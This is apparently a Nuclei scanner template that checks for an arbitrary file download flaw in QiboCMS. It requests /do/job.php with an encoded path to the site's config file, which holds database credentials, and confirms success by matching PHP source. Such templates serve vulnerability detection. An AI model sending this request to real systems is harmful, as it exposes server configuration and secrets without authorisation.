id: qibocms-file-download

info:
  name: qibocms file download- arbitary file download
  author: theabhinavgaur
  severity: high
  tags: qibocms-file-download

requests:
  - method: GET
    path:
      - "{{BaseURL}}/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - <?php

      - type: word
        part: body
        words:
          - $webdb

      - type: status
        status:
          - 200
